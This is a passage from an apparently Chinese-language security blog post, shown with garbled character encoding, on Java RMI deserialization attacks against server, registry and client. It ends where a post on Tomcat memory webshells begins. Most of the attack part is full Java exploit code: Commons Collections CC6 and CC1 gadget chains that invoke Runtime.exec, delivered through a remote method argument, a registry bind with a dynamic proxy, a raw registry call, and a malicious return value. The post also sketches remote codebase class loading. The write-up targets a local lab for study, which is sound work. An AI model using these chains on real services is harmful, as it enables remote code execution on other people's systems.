æ‰€ä»¥è¿™é‡Œä¼šåˆ›å»ºDGCImpl_Stubç±»å®ä¾‹ç­‰ã€‚\nDGCé€šä¿¡çš„å¤„ç†ç±»åŒæ ·çš„æ˜¯ DCGImpl_Skel çš„dispatch()æ–¹æ³•ï¼Œè¿˜æ˜¯å¯¹åº”çš„switch/caseè¯­å¥ï¼Œå¦‚ä¸‹ï¼š case1ï¼š å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨äº†ååºåˆ—åŒ–ï¼Œç„¶åè°ƒç”¨è°ƒç”¨dirty()æ–¹æ³•ï¼Œç„¶åå†åºåˆ—åŒ–è¾“å‡ºã€‚\ncase0å¯¹åº”çš„clean()æ–¹æ³•ã€‚\næ”»å‡» RMI æ”»å‡»Serverç«¯ æ¶æ„æ–¹æ³• è¿œç¨‹æ–¹æ³•çš„è°ƒç”¨æ—¶æœºå‘ç”Ÿåœ¨æœåŠ¡ç«¯ã€‚å½“æ³¨å†Œçš„è¿œç¨‹å¯¹è±¡ä¸Šå­˜åœ¨æŸä¸ªæ¶æ„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å®¢æˆ·ç«¯è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ¥æ”»å‡»æœåŠ¡ç«¯ã€‚æ¯”å¦‚å‡è®¾æœåŠ¡ç«¯æœ‰å¦‚ä¸‹æ–¹æ³•çš„ä»£ç ï¼š\nå®¢æˆ·ç«¯å¦‚ä¸‹è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼š\n1 2 RMIInterface o = (RMIInterface) Naming.lookup(\u0026#34;Hello\u0026#34;); System.out.println(o.evil(\u0026#34;calc\u0026#34;)); è¿™æ ·å°±èƒ½æˆåŠŸåœ¨æœåŠ¡ç«¯è°ƒç”¨è¿™ä¸ªæ¶æ„æ–¹æ³•ã€‚\nï¼ˆä¸ªäººæ„Ÿè§‰åˆ©ç”¨ç‚¹ä¸é«˜ï¼‰\næ¶æ„æœåŠ¡å‚æ•° åœ¨Client ç«¯è·å–åˆ°Serverç«¯åˆ›å»ºçš„Stubåï¼Œä¼šåœ¨æœ¬åœ°è°ƒç”¨è¿™ä¸ªStub å¹¶ä¼ é€’å‚æ•°ï¼ŒStubä¼šåºåˆ—åŒ–è¿™ä¸ªå‚æ•°ï¼Œå¹¶ä¼ é€’ç»™Servreç«¯ã€‚Serverç«¯ä¼šååºåˆ—åŒ–Clientç«¯ä¼ å…¥çš„å‚æ•°å¹¶è¿›è¡Œè°ƒç”¨ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°æ˜¯Objectç±»å‹çš„æƒ…å†µï¼ŒClientç«¯å¯ä»¥ä¼ ç»™Serverç«¯ä»»æ„çš„ç±»ï¼Œç›´æ¥é€ æˆååºåˆ—åŒ–æ¼æ´ã€‚\nåŸºæœ¬åˆ©ç”¨ å°±æ¯”å¦‚æˆ‘å‰é¢ç»™çš„è¿œç¨‹è°ƒç”¨å¯¹è±¡RemoteTest.javaæ–‡ä»¶ï¼Œé‡Œé¢å°±æœ‰ä¸€ä¸ªæ¥æ”¶Objectç±»å‹å‚æ•°çš„æ–¹æ³•ï¼š\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¿œç¨‹è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„sayName()æ–¹æ³•æ—¶ä¼ è¿›å»ä¸€ä¸ªååºåˆ—åŒ–payloadã€‚\nä»¥CC6ä¸ºä¾‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¦‚ä¸‹æ„é€ ï¼š\nRMIClient.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package Rmi.Client; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.Arrays; import java.rmi.Naming; import Rmi.Server.RemoteInterface; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashSet; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; public class RMIClient{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha =new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hashSet = new HashSet(); hashSet.add(outerMap); haha.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); //è·å–æ³¨å†Œè¡¨å¯¹è±¡ Registry r = LocateRegistry.getRegistry(\u0026#34;localhost\u0026#34;,1099); System.out.println(Arrays.toString(r.list())); //å¯»æ‰¾å¯¹åº”RMIå®ä¾‹ RemoteInterface o = (RemoteInterface) Naming.lookup(\u0026#34;Hello\u0026#34;); //è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³• System.out.println(o.sayHello()); System.out.println(o.sayName(hashSet)); } } ç„¶åè¿è¡ŒæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\nè¿è¡Œç»“æœä¸ºï¼š\n1 2 3 [Hello] Hello welcome to use hello[fupanc=1] å…¶ä»–åˆ©ç”¨ åœ¨å‰é¢ï¼Œæˆ‘ä»¬æ˜¯ä¿è¯Serverç«¯å’ŒClientç«¯è°ƒç”¨çš„æœåŠ¡æ¥å£æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆå¦‚æœä¸ä¸€è‡´å¦‚ä½•åˆ©ç”¨ã€‚\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•ä¼ é€’çš„æ˜¯ Server ç«¯èƒ½æ‰¾åˆ°çš„å‚æ•°æ˜¯ HelloObject çš„ Method çš„ hashï¼Œä½†æ˜¯ä¼ é€’çš„å‚æ•°å´ä¸æ˜¯ HelloObject è€Œæ˜¯æ¶æ„çš„ååºåˆ—åŒ–æ•°æ®ï¼ˆå¯èƒ½æ˜¯ Objectæˆ–å…¶ä»–çš„ç±»ï¼‰å‘¢ï¼Ÿ\nç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œåœ¨ mogwailabs çš„ [PPT](https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides Exploiting RMI Services.pdf) ä¸­æå‡ºäº†ä»¥ä¸‹ 4 ç§æ–¹æ³•ï¼š\né€šè¿‡ç½‘ç»œä»£ç†ï¼Œåœ¨æµé‡å±‚ä¿®æ”¹æ•°æ® è‡ªå®šä¹‰ â€œjava.rmiâ€ åŒ…çš„ä»£ç ï¼Œè‡ªè¡Œå®ç° å­—èŠ‚ç ä¿®æ”¹ ä½¿ç”¨ debugger å¹¶ä¸”åœ¨ PPT ä¸­è¿˜ç»™å‡ºäº† hook ç‚¹ï¼Œé‚£å°±æ˜¯åŠ¨æ€ä»£ç†ä¸­ä½¿ç”¨çš„ RemoteObjectInvocationHandler çš„ invokeRemoteMethod æ–¹æ³•ã€‚\nAfant1 å¸ˆå‚…ä½¿ç”¨äº† Java Agent çš„æ–¹å¼ï¼Œåœ¨è¿™ç¯‡æ–‡ç« é‡Œï¼Œ0c0c0f å¸ˆå‚…ä½¿ç”¨äº†æµé‡å±‚çš„æ›¿æ¢ï¼Œåœ¨è¿™ç¯‡æ–‡ç« é‡Œï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…è¯·è‡ªè¡ŒæŸ¥çœ‹ã€‚\næœ€ç®€å•çš„debuggeræ²¡å¤ç°å‡ºæ¥ï¼Œä»¥åå†è¯´å§ï¼Œå­¦å­¦å…¶ä»–çš„åªæœ‰æ–¹æ³•ï¼Œå­¦äº†java agentåå°±æ¥æŠŠè¿™ä¸ªå¤ç°äº†ã€‚\nåˆ©ç”¨æ–¹é¢ï¼šä¸ªäººæ„Ÿè§‰å…¶å®è¿˜æ˜¯æŒºå¹¿çš„ï¼Œæ¯”å¦‚æœåŠ¡ç«¯è¦æ±‚åªæ¥æ”¶ä¸€ä¸ªç±»å‹çš„å‚æ•°ï¼Œä½†æ˜¯æˆ‘å°±æ˜¯è¦ä¼ ååºåˆ—åŒ–çš„è¿›å»ã€‚å¤§æ¦‚å°±è¿™æ ·è§£å†³äº†ã€‚\næ€»ç»“å°±æ˜¯ Serverç«¯çš„è°ƒç”¨æ–¹æ³•å­˜åœ¨éåŸºç¡€ç±»å‹çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥è¢«æ¶æ„ Client ç«¯ä¼ å…¥\nåŠ¨æ€ç±»åŠ è½½ åœ¨å‰é¢ä¹Ÿè¯´è¿‡ï¼ŒRMIçš„é‡è¦ç‰¹æ€§ï¼šåŠ¨æ€ç±»åŠ è½½æœºåˆ¶ã€‚å°±æ˜¯å½“æœ¬åœ° ClassPath ä¸­æ— æ³•æ‰¾åˆ°å“åº”çš„ç±»æ—¶ï¼Œä¼šåœ¨æŒ‡å®šçš„codebase é‡ŒåŠ è½½ classã€‚è¿™ä¸ªç‰¹æ€§åœ¨ 6u45/7u21 ä¹‹å‰éƒ½æ˜¯é»˜è®¤å¼€å¯çš„ã€‚\nä¸ºäº†èƒ½å¤Ÿè¿œç¨‹åŠ è½½ç›®æ ‡ç±»ï¼Œéœ€è¦ Serrver åŠ è½½å¹¶é…ç½® SecurityManagerï¼Œå¹¶è®¾ç½®java.rmi.server.useCodebaseOnly=falseã€‚\nServer ç«¯è°ƒç”¨ UnicastServerRef çš„dispatchæ–¹æ³•å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œè°ƒç”¨unmarshalParametersæ–¹æ³•ååºåˆ—åŒ–å®¢æˆ·ç«¯ä¼ æ¥çš„å‚æ•°ã€‚\nè¿™ä¸ªæ–¹æ³•çš„ååºåˆ—åŒ–ç”±MarshalInputStreamç±»å®ç°ï¼Œè·Ÿè¿›å®ƒçš„resolveClassæ–¹æ³•ï¼š\nè¿™é‡Œé€šè¿‡readLocation()æ–¹æ³•è·å–codebaseåœ°å€ã€‚\nç„¶åéœ€è¦æ»¡è¶³useCodebaseOnlyä¸ºfalseï¼Œç„¶åæ‰èƒ½ä¼ å…¥codebaseå˜é‡ã€‚\nç„¶åè°ƒç”¨RMIClassLoader#loadClass()æ–¹æ³•æ¥åŠ è½½ç±»ï¼Œå®é™…ä¸Šå§”æ‰˜çš„æ˜¯sun.rmi.server.LoaderHandler.loadClassæ–¹æ³•ã€‚\næ–¹æ³•ä¸­è°ƒç”¨åˆ°äº†loadClassForName()æ–¹æ³•\né€šè¿‡ Class.forName() ä¼ å…¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨ LoaderHandler$Loader æ¥ä»è¿œç¨‹åœ°å€åŠ è½½ç±»ã€‚\nè€Œ LoaderHandler$Loader æ˜¯ URLClassLoader çš„å­ç±»ã€‚\næœ€åä¼šè°ƒç”¨åˆ°URLClassLoader.loadClassæ–¹æ³•æ¥åŠ è½½ç±»\nå› æ­¤ Client ç«¯å¯ä»¥é€šè¿‡é…ç½®æ­¤é¡¹å±æ€§ï¼Œå¹¶å‘ Server ç«¯ä¼ é€’ä¸å­˜åœ¨çš„ç±»ï¼Œä½¿ Server ç«¯è¯•å›¾ä» java.rmi.server.codebase åœ°å€ä¸­è¿œç¨‹åŠ è½½æ¶æ„ç±»è€Œè§¦å‘æ”»å‡»ã€‚\næ›¿èº«æ”»å‡» å½“è¿œç¨‹å¯¹è±¡æ¥æ”¶å‚æ•°ç±»å‹ä¸å†æ˜¯Objectï¼Œè€Œæ˜¯æŒ‡å®šç±»å‹ï¼ˆè¿œç¨‹å¯¹è±¡ç±»å‹ï¼‰ã€‚\nè€Œæ”»å‡»è€…å¸Œæœ›ä½¿ç”¨ CC é“¾æ¥ååºåˆ—åŒ–ï¼Œæ¯”å¦‚ä½¿ç”¨äº†ä¸€ä¸ªå…¥å£ç‚¹ä¸ºHashMapçš„expï¼Œé‚£ä¹ˆæ”»å‡»è€…åœ¨æœ¬åœ°çš„ç¯å¢ƒä¸­å°†HashMapé‡å†™ï¼Œè®©HashMapç»§æ‰¿æ³¨å†Œçš„è¿œç¨‹å¯¹è±¡ï¼ˆRemoteObjectï¼‰\nï¼ˆäº†è§£ä¸€ä¸‹è¿™ä¸ªæ€è·¯ï¼Œå…¶å®å’Œå‰é¢è¯´çš„é‚£ä¸ªæœ‰ç‚¹é‡åˆäº†ã€‚ä¸å¤šè¯´ï¼‰\næ”»å‡»æ³¨å†Œä¸­å¿ƒ å¯¹åº”çš„ååºåˆ—åŒ–è§¦å‘ç‚¹åœ¨RegistryImpl_Skelç±»çš„dispatch()æ–¹æ³•ã€‚å½“è°ƒç”¨Naming.lookup()æ–¹æ³•æˆ–bind()æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨åˆ°è¿™ä¸ªdispatch()æ–¹æ³•ä¸­ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”çš„switch/caseæ–¹æ³•ã€‚\næ³¨å†Œä¸­å¿ƒçš„åŸºæœ¬æ–¹æ³•ï¼š\nbind() list() lookup() rebind() unbind() å‰é¢æˆ‘ä»¬å°±åˆ†æäº†ï¼Œåœ¨Clientç«¯æˆ–è€…Serverç«¯è°ƒç”¨è¿™äº›åŸºæœ¬æ–¹æ³•æ—¶ï¼ŒåŸºæœ¬éƒ½ä¼šè¿›å…¥åˆ°è¿™é‡Œçš„switch/caseè¯­å¥å†æ¬¡è°ƒç”¨ã€‚\nå¹¶ä¸”åœ¨è¿™äº›åŸºæœ¬æ–¹æ³•ä¸­ï¼Œæœ‰çš„è¿˜ä¼šååºåˆ—åŒ–RemoteCallå­—èŠ‚æµæ¥è·å–è¿œç¨‹å¯¹è±¡å’ŒRMIæœåŠ¡åç§°ï¼Œå°±æœ‰å¯èƒ½ä¼šè§¦å‘ååºåˆ—åŒ–æ”»å‡»ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼šä¸€èˆ¬Javaè¿œç¨‹è®¿é—®æ³¨å†Œä¸­å¿ƒåšäº†é™åˆ¶ï¼Œåªæœ‰æ¥æºåœ°å€ä¸ºæœ¬åœ°æ‰èƒ½è°ƒç”¨bindã€rebindã€unbindæ–¹æ³•ã€‚\nbind/rebind ï¼ˆä¸€èˆ¬è¿™ä¸ªå¯ä»¥å½’ç±»ä¸ºæœåŠ¡ç«¯æ”»å‡»ï¼‰\nè¿™ä¸¤ä¸ªæ–¹æ³•é™„è¿‘éƒ½æ˜¯è°ƒç”¨äº†ååºåˆ—åŒ–çš„ã€‚ æ‰€ä»¥è¿™é‡Œä½¿ç”¨è¿™ä¸¤ä¸ªéƒ½æ˜¯å¯ä»¥çš„ã€‚\nè€Œbind()æ–¹æ³•å‚æ•°éœ€è¦ä¸€ä¸ªRemoteç±»å‹çš„å¯¹è±¡ï¼š\nå¦‚ä½•æ»¡è¶³å‘¢ï¼ŒåŠ¨æ€ä»£ç†ï¼Œè¿™æ˜¯å› ä¸ºå½“ä»£ç†ç±»proxyè¢«ååºåˆ—åŒ–æ—¶ï¼Œè¢«ä»£ç†å¯¹è±¡ä¹Ÿä¼šè¢«ååºåˆ—åŒ–ï¼Œè‡ªç„¶ä¹Ÿä¼šæ‰§è¡ŒPOCé“¾ã€‚\næ“ä½œç‚¹å°±å¾ˆå¤šäº†ï¼Œåœ¨CC1ä¸­åˆ©ç”¨AnnotationInvocationHandlerï¼Œå®ƒæ˜¯InvocationHandlerçš„å­ç±»ï¼Œå¯ä»¥å†æ¬¡å€Ÿç”¨ï¼Œæ¥ä¿®æ”¹ä¼ å…¥å‚æ•°çš„ç±»å‹ã€‚å¦‚ä¸‹æ“ä½œï¼š\nCC1+åŠ¨æ€ä»£ç†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package Rmi.Server; import java.rmi.Remote; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Proxy; import java.lang.annotation.Retention; public class RMI_attack { public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Class[] interfaces = LazyMap.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),interfaces,handler); Object o = constructor1.newInstance(Retention.class,proxyMap); Remote proxy = (Remote)Proxy.newProxyInstance(Remote.class.getClassLoader(),new Class[]{Remote.class},(InvocationHandler)o); Registry r = LocateRegistry.getRegistry(\u0026#34;localhost\u0026#34;,1099); r.bind(\u0026#34;fupanc\u0026#34;,proxy); } } è¿™é‡Œç”¨çš„LazyMapé“¾ï¼ŒåŒæ ·çš„TransformedMapé“¾ä¹Ÿèƒ½ç”¨ã€‚\nï¼ˆä½†æ˜¯æœ‰ç‚¹å°æ€ªçš„å°±æ˜¯ä¸åº”è¯¥åªæœ‰8u71ä»¥ä¸‹æ‰èƒ½å¼¹å—ï¼Œ8u411ä¹Ÿèƒ½å¼¹äº†ï¼Ÿï¼‰\nunbind/lookup è¿™ä¸¤ä¸ªæ–¹æ³•çš„åˆ©ç”¨ä¹Ÿè®¸æœ‰JDKç‰ˆæœ¬è¦æ±‚ï¼ŸJDK8u411å¹¶æ²¡æœ‰çœ‹åˆ°ååºåˆ—åŒ–ï¼Œè€ŒJDK8u71å´æœ‰ååºåˆ—åŒ–æ“ä½œã€‚è¿™é‡Œå…ˆç”¨JDK8u71çœ‹çœ‹ã€‚\nï¼ˆè™½ç„¶æ³¨å†Œä¸­å¿ƒæœ‰é™åˆ¶ï¼Œä½†æ˜¯lookup()æ–¹æ³•åœ¨å®¢æˆ·ç«¯ä¹Ÿæ˜¯èƒ½ç”¨çš„ï¼‰\nåœ¨JDK8u71ä¸­ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•ä¹Ÿå­˜åœ¨ååºåˆ—åŒ–ï¼š\nå¦‚æœèƒ½æ§åˆ¶var10ï¼Œå°±èƒ½é€ æˆä»»æ„ç±»ååºåˆ—åŒ–ã€‚å³ç°åœ¨éœ€è¦æ§åˆ¶è¿™ä¸ªvar2ï¼Œè™½ç„¶è¿™æ”¹æˆäº†8u71ï¼Œä½†æ˜¯è¿‡ç¨‹å·®ä¸å¤šã€‚\næº¯æºä¸€ä¸‹å‚æ•°ï¼Œå¯ä»¥å‘ç°è¿™é‡Œçš„var2å°±æ˜¯StreamRemoteCallå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯é‚£ä¸ªè¿æ¥å¯¹è±¡ã€‚\nç›¸å…³çš„ä¼ è¾“è¿‡ç¨‹ï¼š\nè¿™é‡Œå°±æ˜¯è°ƒç”¨çš„Invoke()æ–¹æ³•æ¥ä¼ è¾“æ•°æ®ã€‚\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥è°ƒç”¨this.invokeæ–¹æ³•æ¥ä¼ è¾“è¯·æ±‚åˆ°æ³¨å†Œä¸­å¿ƒã€‚éœ€è¦çš„å‚æ•°å¦‚ä¸‹ï¼š\nå…ˆè·å–å¯¹åº”çš„RegistryImpl_Stubå¯¹è±¡ï¼š\n1 Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;, 1099); ç„¶åè·å–åˆ°è¿™ä¸ªrefå˜é‡ï¼Œè¿™ä¸ªrefæ˜¯Registryimpl_Stubç±»çš„çˆ¶ç±»çš„çˆ¶ç±»çš„å˜é‡ï¼Œè¿™ä¸ªå˜é‡çš„èµ‹å€¼åœ¨å‰é¢æ³¨å†Œä¸­å¿ƒåˆ›å»ºé‚£é‡Œæ˜¯è¯´æ˜äº†çš„ï¼Œå¦‚ä¸‹ä»£ç è·å–ï¼š\n1 2 3 Field field0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredField(\u0026#34;ref\u0026#34;); field0.setAccessible(true); UnicastRef unicastRef = (UnicastRef)field0.get(registry); è¿™é‡Œè·å–åˆ°è¿æ¥å¯¹è±¡è¿˜éœ€è¦è·å–åˆ°operationså˜é‡çš„å€¼ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 Field field1 = registry.getClass().getDeclaredField(\u0026#34;operations\u0026#34;); field0.setAccessible(true); Operation[] operation = (Operation[])field1.get(registry); ç„¶åç›´æ¥æ‹¼æ¥è¿›æ¶æ„ç±»å³å¯ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨CC6ï¼Œæ³¨æ„ç‚¹ç»†èŠ‚è¿˜æ˜¯å¾ˆå¥½çœ‹æ‡‚çš„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package Rmi.Server; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import sun.rmi.server.UnicastRef; import java.io.ObjectOutput; import java.lang.reflect.Field; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.Operation; import java.rmi.server.RemoteCall; import java.rmi.server.RemoteObject; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashSet; public class RMI_attack { public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha =new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hashSet = new HashSet(); hashSet.add(outerMap); haha.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); //æ¶æ„å‘åŒ… Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;, 1099); //ref Field field0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredField(\u0026#34;ref\u0026#34;); field0.setAccessible(true); UnicastRef unicastRef = (UnicastRef)field0.get(registry); //operation Field field2 = registry.getClass().getDeclaredField(\u0026#34;operations\u0026#34;); field2.setAccessible(true); Operation[] operation = (Operation[])field2.get(registry); RemoteCall var2 = unicastRef.newCall((RemoteObject)registry, operation, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(hashSet); unicastRef.invoke(var2); } } æ”»å‡»Clientç«¯ å¦‚æœæ”»å‡»çš„ç›®æ ‡ä½œä¸ºClientç«¯ï¼Œä¹Ÿå°±æ˜¯åœ¨Registry/Serverç«¯å¯æ§æ—¶ï¼Œä¹Ÿæ˜¯å¯ä»¥å¯¼è‡´æ”»å‡»çš„ã€‚å®¢æˆ·ç«¯ä¸»è¦æœ‰ä¸¤ä¸ªäº¤äº’è¡Œä¸ºï¼Œç¬¬ä¸€æ˜¯ä»Registryç«¯è·å–è°ƒç”¨æœåŠ¡çš„Stub å¹¶ååºåˆ—åŒ–ï¼Œç¬¬äºŒæ­¥æ˜¯è°ƒç”¨æœåŠ¡åè·å–æ‰§è¡Œç»“æœå¹¶ååºåˆ—åŒ–ã€‚\næœ‰å¦‚ä¸‹å‡ ä¸ªåˆ©ç”¨ç‚¹ï¼š\næ¶æ„Server Stubï¼š Clientç«¯åœ¨Registryç«¯lookupåæ‹¿åˆ°çš„åœ¨Serverç«¯åœ¨registryç«¯æ³¨å†Œçš„ ä»£ç†å¯¹è±¡å¹¶ååºåˆ—åŒ–è§¦å‘æ¼æ´ã€‚\næ¶æ„Server ç«¯è¿”å›å€¼ å°±æ˜¯Serverç«¯è¿”å›ä¸ªiClientç«¯æ¶æ„çš„è¿”å›å€¼ï¼ŒClientç«¯ååºåˆ—åŒ–è§¦å‘æ¼æ´ã€‚\nåŠ¨æ€ç±»åŠ è½½ï¼š åŒæ”»å‡»Serverç«¯çš„åŠ¨æ€ç±»åŠ è½½ï¼ŒServerç«¯è¿”å›ç»™Clientç«¯ä¸å­˜åœ¨çš„ç±»ï¼Œè®©Clientç«¯å»codebaseåœ°å€è¿œç¨‹åŠ è½½æ¶æ„ç±»è§¦å‘æ¼æ´ã€‚\nç®€å•ä»¥Serverç«¯ä¸ºä¾‹ï¼š\nRemoteTestç±»ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package Rmi.Server; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashSet; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; public class RemoteTest extends UnicastRemoteObject implements RemoteInterface { protected RemoteTest() throws RemoteException{ } public String sayHello() throws RemoteException{ return \u0026#34;Hello welcome to use\u0026#34;; } public Object sayName() throws RemoteException , Exception{ Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha =new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hashSet = new HashSet(); hashSet.add(outerMap); haha.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); return (Object)hashSet; } } æ¥å£å“ªäº›ç®€å•æ”¹æ”¹å³å¯ï¼Œç„¶åå®¢æˆ·ç«¯è°ƒç”¨å³å¯ï¼š æˆåŠŸååºåˆ—åŒ–ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://su18.org/post/rmi-attack/#%E4%B8%80-rmi-%E4%BB%8B%E7%BB%8D\nhttps://nivi4.notion.site/Java-RMI-8eae42201b154ecc89455a480bcfc164\nhttps://www.cnblogs.com/gaorenyusi/p/18329213\n","date":"2024-09-25T22:54:06+08:00","permalink":"https://fupanc-w1n.github.io/p/rmi/","title":"RMI"},{"content":"Tomcatå†…å­˜é©¬ å†…å­˜é©¬å³ä»…å­˜åœ¨äºå†…å­˜ä¸­çš„æ— æ–‡ä»¶æ¶æ„ä»£ç ã€‚ä¹Ÿå°±æ˜¯æ— æ–‡ä»¶è½åœ°çš„ webshell 